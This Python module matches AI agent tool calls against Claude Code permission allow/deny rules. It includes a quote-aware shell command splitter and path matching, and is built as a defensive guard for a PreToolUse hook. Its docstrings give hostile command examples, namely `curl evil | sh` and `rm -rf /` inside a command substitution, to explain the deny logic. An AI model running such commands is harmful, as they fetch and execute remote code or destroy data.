"""Matching a tool call against Claude Code permission rules.

DG-236 needs this because the PreToolUse hook has to answer one question
before it does anything else: *is this call already forbidden?* The harness
keeps its own copy of that judgement, but a hook that hands remote approval
authority over tool calls cannot depend on being asked in the right order --
it has to be able to refuse on its own.

**This is a soft control and is documented as one.** Matching a shell command
by prefix cannot be made sound: ``rm -rf`` and ``rm -r -f`` are the same
action and only one of them is spelled like the rule. So the design does not
pretend otherwise. It leans the whole way:

- **Deny is greedy.** Plain prefix, no word boundary, every segment of a
  compound command scanned, command substitutions included. A false positive
  costs a prompt.
- **Allow is strict.** Word-boundary prefix, and a compound command is
  allowed only when *every* segment is allowed. A false positive here is a
  hole, so `git status && curl evil | sh` is not "a git status command".

The safety property the hook actually rests on is narrower and does hold: it
never widens permission. It converts a prompt into a question for the Boss,
and the harness's own deny list still applies underneath.
"""

from __future__ import annotations

import fnmatch
import json
import os
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Final, Optional, Sequence

#: Where a tool hides the path it is about to touch. Read/Edit/Write use the
#: first; the search tools use the second; notebooks the third.
PATH_KEYS: Final = ("file_path", "path", "notebook_path")

#: The specifier suffix that turns an exact match into a prefix match.
PREFIX_SUFFIX: Final = ":*"

_GLOB_CHARS: Final = ("*", "?", "[")

#: Two-character shell operators, checked before the single-character ones so
#: `&&` is not read as two backgrounding `&`.
_TWO_CHAR_OPERATORS: Final = ("&&", "||", "$(")
_ONE_CHAR_OPERATORS: Final = (";", "|", "&", "\n", "`", "(", ")")


class UnparseableRule(ValueError):
    """A rule string that does not read as a permission rule.

    Deliberately not a :class:`~core.errors.DrunkenError`: this never reaches
    an agent as a tool result. :func:`load_rules` decides what to do with it,
    and what it does depends on which list the rule was on.
    """


def split_command(command: str) -> list[str]:
    """Split a shell command into the commands it will actually run.

    Quote-aware, because ``grep 'a && b' file`` is one command and splitting
    it would invent a second that was never run. Command substitutions are
    split out rather than skipped -- ``echo $(rm -rf /)`` runs the ``rm``, and
    a scan that only sees ``echo`` is not a scan.

    This is a scanner, not a shell parser. It does not understand here-docs,
    process substitution or nested quoting inside substitutions. That is the
    soft-control caveat in the module docstring, made concrete.
    """
    segments: list[str] = []
    current: list[str] = []
    quote: Optional[str] = None
    i = 0
    while i < len(command):
        char = command[i]

        if quote is not None:
            # Inside single quotes a backslash is literal, so only honour the
            # escape in double quotes -- otherwise 'a\' ends the quote early.
            if char == "\\" and quote == '"' and i + 1 < len(command):
                current.append(char)
                current.append(command[i + 1])
                i += 2
                continue
            current.append(char)
            if char == quote:
                quote = None
            i += 1
            continue

        if char == "\\" and i + 1 < len(command):
            current.append(char)
            current.append(command[i + 1])
            i += 2
            continue

        if char in ("'", '"'):
            quote = char
            current.append(char)
            i += 1
            continue

        pair = command[i : i + 2]
        if pair in _TWO_CHAR_OPERATORS:
            segments.append("".join(current))
            current = []
            i += 2
            continue

        if char in _ONE_CHAR_OPERATORS:
            segments.append("".join(current))
            current = []
            i += 1
            continue

        current.append(char)
        i += 1

    segments.append("".join(current))
    return [segment.strip() for segment in segments if segment.strip()]


@dataclass(frozen=True)
class Rule:
    """One entry from ``permissions.allow`` or ``permissions.deny``."""

    tool: str
    specifier: Optional[str] = None
    base_dir: Optional[str] = None

    @classmethod
    def parse(cls, raw: str, base_dir: Optional[str] = None) -> "Rule":
        text = raw.strip()
        if not text:
            raise UnparseableRule("An empty string is not a permission rule.")

        if "(" not in text:
            return cls(tool=text, specifier=None, base_dir=base_dir)

        if not text.endswith(")"):
            raise UnparseableRule(
                f"{raw!r} opens a specifier with '(' and never closes it."
            )

        tool, _, remainder = text.partition("(")
        specifier = remainder[:-1]
        if not tool:
            raise UnparseableRule(f"{raw!r} has no tool name before its '('.")
        return cls(tool=tool, specifier=specifier, base_dir=base_dir)

    def matches(
        self, tool_name: str, tool_input: dict[str, Any], *, strict: bool = True
    ) -> bool:
        """Whether this rule covers *one* call.

        `strict` is the allow/deny asymmetry: with it, a prefix must end on a
        word boundary, so `Bash(git log:*)` does not answer for `git logout`.
        Without it the prefix is plain, so `Bash(rm -rf:*)` still catches
        `rm -rfv`. Callers do not pass this -- :func:`is_allowed` and
        :func:`is_denied` each pick the side they need.
        """
        if tool_name != self.tool:
            return False
        if self.specifier is None:
            return True
        if tool_name == "Bash":
            return self._matches_command(tool_input.get("command", ""), strict=strict)
        return self._matches_path(tool_input)

    def _matches_command(self, command: str, *, strict: bool) -> bool:
        command = command.strip()
        assert self.specifier is not None
        if not self.specifier.endswith(PREFIX_SUFFIX):
            return command == self.specifier

        prefix = self.specifier[: -len(PREFIX_SUFFIX)]
        if not command.startswith(prefix):
            return False
        if not strict:
            return True
        rest = command[len(prefix) :]
        return rest == "" or rest[0].isspace()

    def _matches_path(self, tool_input: dict[str, Any]) -> bool:
        assert self.specifier is not None
        raw = next(
            (
                tool_input[key]
                for key in PATH_KEYS
                if isinstance(tool_input.get(key), str)
            ),
            None,
        )
        if raw is None:
            return False

        candidate = os.path.normpath(os.path.join(self.base_dir or "", raw))
        pattern = self.specifier

        # An unanchored `**/...` rule is about the file's name at any depth,
        # so joining it to a base directory would defeat it. Everything else
        # is resolved against the base so `./.env` and `/repo/.env` -- and
        # `/repo/src/../.env` -- are recognised as the same file.
        if not pattern.startswith("**") and not os.path.isabs(pattern):
            pattern = os.path.normpath(os.path.join(self.base_dir or "", pattern))

        if any(char in pattern for char in _GLOB_CHARS):
            return fnmatch.fnmatch(candidate, pattern)
        return candidate == pattern


@dataclass(frozen=True)
class Rules:
    """The two lists, already parsed."""

    allow: list[Rule] = field(default_factory=list)
    deny: list[Rule] = field(default_factory=list)


class _AlwaysMatches(Rule):
    """Stand-in for a deny rule that could not be parsed.

    A rule nobody can read is a rule nobody should be granted. On the deny
    side that means matching everything: the operator wrote something there
    intending to forbid, and the honest response to not understanding it is
    to ask a human rather than to proceed. :func:`load_rules` drops the same
    unparseable string from the allow side entirely.
    """

    def matches(
        self, tool_name: str, tool_input: dict[str, Any], *, strict: bool = True
    ) -> bool:
        return True


def load_rules(settings_path: Path | str, base_dir: Optional[str] = None) -> Rules:
    """Read ``permissions.allow`` / ``permissions.deny`` from a settings file.

    A missing or corrupt file reads as empty rather than raising (principle
    4). Note what that means in each direction: no allow rules is not a
    lockout, because the hook falls through to the harness's own prompt, and
    no deny rules is not consent, because the harness still has its copy.
    """
    path = Path(settings_path)
    try:
        raw = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return Rules()

    permissions = raw.get("permissions") if isinstance(raw, dict) else None
    if not isinstance(permissions, dict):
        return Rules()

    if base_dir is None:
        base_dir = str(path.parent.parent)

    allow: list[Rule] = []
    for entry in permissions.get("allow", []) or []:
        try:
            allow.append(Rule.parse(entry, base_dir=base_dir))
        except (UnparseableRule, AttributeError, TypeError):
            continue

    deny: list[Rule] = []
    for entry in permissions.get("deny", []) or []:
        try:
            deny.append(Rule.parse(entry, base_dir=base_dir))
        except (UnparseableRule, AttributeError, TypeError):
            deny.append(_AlwaysMatches(tool="", specifier=None, base_dir=base_dir))

    return Rules(allow=allow, deny=deny)


#: The gitignored, per-worktree file the approval hook learns into (DG-297).
#: `settings.json` is the shared, committed policy; this sits beside it and
#: is never tracked -- see the `.claude/*` / `!.claude/settings.json` pair in
#: `.gitignore`.
LOCAL_SETTINGS_FILENAME: Final = "settings.local.json"


def load_layered_rules(project_dir: Path | str) -> Rules:
    """The tracked policy plus this worktree's locally learned overrides.

    Mirrors what the harness itself merges for a Claude Code project:
    `.claude/settings.json` (shared, committed) and `.claude/settings.local.json`
    (personal, gitignored) stack, with the local file adding to -- never
    replacing -- the tracked one. Only `allow` is layered in from the local
    file: a personal override that could add a `deny` nobody else can see
    would be its own kind of surprise, and the tracked deny list already
    covers what needs to hold for everyone.
    """
    base = Path(project_dir) / ".claude"
    tracked = load_rules(base / "settings.json")
    local = load_rules(base / LOCAL_SETTINGS_FILENAME)
    return Rules(allow=[*tracked.allow, *local.allow], deny=tracked.deny)


def _segments(tool_name: str, tool_input: dict[str, Any]) -> list[dict[str, Any]]:
    """One pseudo-call per command a Bash invocation will actually run."""
    if tool_name != "Bash":
        return [tool_input]
    parts = split_command(str(tool_input.get("command", "")))
    if not parts:
        return [tool_input]
    return [{**tool_input, "command": part} for part in parts]


def is_denied(
    tool_name: str, tool_input: dict[str, Any], rules: Sequence[Rule]
) -> bool:
    """True when *any* part of this call matches *any* deny rule."""
    return any(
        rule.matches(tool_name, segment, strict=False)
        for segment in _segments(tool_name, tool_input)
        for rule in rules
    )


def is_allowed(
    tool_name: str, tool_input: dict[str, Any], rules: Sequence[Rule]
) -> bool:
    """True only when *every* part of this call matches *some* allow rule."""
    segments = _segments(tool_name, tool_input)
    if not rules:
        return False
    return all(
        any(rule.matches(tool_name, segment, strict=True) for rule in rules)
        for segment in segments
    )
